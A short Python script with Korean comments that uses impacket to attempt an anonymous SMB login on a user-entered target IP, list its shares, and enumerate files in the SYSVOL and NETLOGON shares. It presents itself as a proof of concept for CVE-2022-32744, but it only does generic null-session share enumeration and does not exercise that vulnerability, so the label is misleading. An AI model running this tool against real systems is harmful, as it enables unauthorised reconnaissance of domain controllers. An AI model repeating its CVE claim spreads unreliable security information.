import sys
from impacket.smbconnection import SMBConnection

def list_shares_and_files(target_ip, target_port=445):
    try:
        # SMBConnection 객체 생성 (포트 445로 연결)
        conn = SMBConnection(target_ip, target_ip, sess_port=target_port)
        
        # 익명 로그인 시도
        conn.login('', '')
        print(f"[+] {target_ip}에 익명 로그인 성공. CVE-2022-32744 취약성 테스트 중...")

        # 공유 목록 가져오기
        shares = conn.listShares()
        print(f"[+] 공유 목록을 성공적으로 가져왔습니다.")
        
        # 공유된 리소스에 접근 시도
        for share in shares:
            share_name = share['shi1_netname'][:-1]  # 공유 이름 (널 문자 제거)
            print(f"[+] 공유 이름: {share_name}")
            
            # 민감한 공유 폴더 (sysvol, netlogon)에 접근 시도
            if share_name.lower() in ['sysvol', 'netlogon']:
                print(f"[*] '{share_name}' 공유에서 파일 목록을 시도 중...")
                
                try:
                    # 공유 폴더 내 파일 목록 가져오기
                    file_list = conn.listPath(share_name, '*')
                    print(f"[+] '{share_name}' 공유의 파일 목록:")
                    for file in file_list:
                        print(f"    - {file.get_longname()}")
                
                except Exception as e:
                    print(f"[!] '{share_name}' 공유에 접근하지 못했습니다: {e}")
        
        # 연결 종료
        conn.logoff()

    except Exception as e:
        print(f"[!] {target_ip}에 연결하는 동안 오류 발생: {e}")

if __name__ == "__main__":
    # 사용자에게 타겟 IP 입력을 요청
    target_ip = input("테스트할 타겟 IP 주소를 입력하세요: ")
    
    # SMB 연결 테스트 및 PoC 실행
    print(f"\n[INFO] CVE-2022-32744 PoC 실행 중...")
    list_shares_and_files(target_ip)

